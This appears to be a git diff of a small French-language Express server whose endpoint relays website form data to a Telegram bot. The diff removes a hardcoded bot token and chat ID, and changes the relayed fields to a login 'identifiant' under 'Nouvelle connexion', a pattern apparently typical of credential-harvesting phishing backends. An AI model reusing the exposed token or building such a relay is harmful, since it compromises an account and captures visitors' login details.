@@ -6,38 +6,40 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-const BOT_TOKEN = "8798036184:AAF79RiM_zC2TjbCwHh2w1jZpqVOoIv__y4";
-const CHAT_ID = "8135402030";
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 app.post("/send-telegram", async (req, res) => {
   try {
-    const { prenom, age } = req.body;
+    const { identifiant } = req.body;
 
-    console.log("Reçu du site :", prenom, age);
+    console.log("Reçu du site :", identifiant);
 
     const message = `
 Nouvelle connexion :
 
-Prénom : ${prenom}
-Âge : ${age}
+Identifiant : ${identifiant}
 `;
 
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message
-      })
-    });
+    const response = await fetch(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      }
+    );
 
     const data = await response.json();
 
     console.log("Réponse Telegram :", data);
 
-    res.json({ success: true, telegram: data });
+    res.json({ success: true });
 
   } catch (error) {
     console.log("Erreur :", error);
@@ -45,6 +47,8 @@ Prénom : ${prenom}
   }
 });
 
-app.listen(3000, () => {
-  console.log("Serveur lancé sur http://localhost:3000");
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () => {
+  console.log(`Serveur lancé sur le port ${PORT}`);
 });
